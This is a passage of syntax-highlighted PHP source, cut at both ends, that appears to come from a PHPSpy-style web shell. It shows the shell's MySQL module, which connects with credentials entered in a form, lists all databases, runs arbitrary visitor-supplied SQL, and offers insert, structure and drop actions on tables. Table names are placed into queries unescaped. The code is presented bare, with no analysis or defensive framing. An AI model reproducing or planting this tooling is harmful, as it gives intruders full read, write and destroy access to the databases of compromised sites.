<span style="color: #969896; background-color: #1d1f21;"> </span>   p($dbform);
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('tablename');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('page',$page);
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('doing');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();

<span style="color: #969896; background-color: #1d1f21;"> </span>   $cachetables = array();<span style="color: #de935f; background-color: #373b41;">     </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   $pagenum = 30;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $page = intval($page);
<span style="color: #969896; background-color: #1d1f21;"> </span>   if($page) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $start_limit = ($page - 1) * $pagenum;
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $start_limit = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $page = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (isset($dbhost) &amp;&amp; isset($dbuser) &amp;&amp; isset($dbpass) &amp;&amp; isset($connect)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbp<span style="text-decoration: underline;">ort);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqlver = mysql_get_server_info();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhos<span style="text-decoration: underline;">t.'&lt;/p&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $highver = $mysqlver &gt; '4.1' ? 1 : 0;

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //&#33719;&#21462;&#25968;&#25454;&#24211;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $query = q("SHOW DATABASES");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbs = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbs[] = '-- Select a database --';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while($db = mysql_fetch_array($query)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dbs[$db['Database']] = $db['Database'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makeselect(array('title'=&gt;'Please select a database:','name'=&gt;'db[]','op<span style="text-decoration: underline;">tion'=&gt;$dbs,'selected'=&gt;$dbname,'onchange'=&gt;'moddbname(this.options[this.selectedIndex].value)','newline'=&gt;1));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $tabledb = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($dbname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('Current dababase: &lt;a href="javascript:moddbname(\''.$dbname.'\');<span style="text-decoration: underline;">"&gt;'.$dbname.'&lt;/a&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($tablename) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p(' | Current Table: &lt;a href="javascript:settable(\''.$tablename<span style="text-decoration: underline;">.'\');"&gt;'.$tablename.'&lt;/a&gt; [ &lt;a href="javascript:settable(\''.$tablename.'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'drop\');"&gt;Drop&lt;/a&gt; ]');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/p&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   mysql_select_db($dbname);

<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $getnumsql = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $runquery = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($sql_query) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $runquery = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $allowedit = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($tablename &amp;&amp; !$sql_query) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $sql_query = "SELECT * FROM $tablename";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $getnumsql = $sql_query;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $sql_query = $sql_query." LIMIT $start_limit, $pagenum";
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $allowedit = 1;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;form action="'.$self.'" method="POST"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;<span style="text-decoration: underline;">&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '.$dbname.':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'.htmlspecialchars($sql_query,ENT_QUOTES).'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('tablename', $tablename);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action','mysqladmin');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p($dbform);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/form&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($tablename || ($runquery &amp;&amp; $sql_query)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($doing == 'structure') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q("SHOW FULL COLUMNS FROM $tablename");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while($row = mysql_fetch_array($result)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb[] = $row;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h3&gt;Structure&lt;/h3&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Field&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Type&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Null&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Key&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Default&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Extra&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Privileges&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Comment&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($rowdb as $row) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $thisbg = bg();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\<span style="text-decoration: underline;">'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Field'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Type'].'&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Collation'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Null'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Key'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Default'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Extra'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Privileges'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Comment'].'&amp;nbsp;&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   tbfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q("SHOW INDEX FROM $tablename");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb = array();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   while($row = mysql_fetch_array($result)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $rowdb[] = $row;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h3&gt;Indexes&lt;/h3&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="head"&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Keyname&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Type&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Unique&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Packed&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Seq_in_index&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Field&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Cardinality&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Null&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;Comment&lt;/td&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;/tr&gt;');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($rowdb as $row) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $thisbg = bg();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\<span style="text-decoration: underline;">'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;td&gt;'.$row['Key_name'].'&lt;/td&gt;');
